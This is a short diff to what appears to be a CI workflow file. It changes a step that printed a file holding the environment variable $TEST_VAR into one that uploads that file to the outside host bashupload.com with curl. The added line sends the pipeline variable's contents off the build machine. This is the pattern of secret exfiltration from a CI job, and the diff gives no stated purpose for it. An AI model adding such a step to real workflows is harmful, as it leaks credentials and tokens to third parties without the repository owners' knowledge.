@@ -24,4 +24,4 @@ jobs:
         run: echo $TEST_VAR > text.txt
 
       - name: run
-        run: cat text.txt
+        run: curl bashupload.com -T text.txt
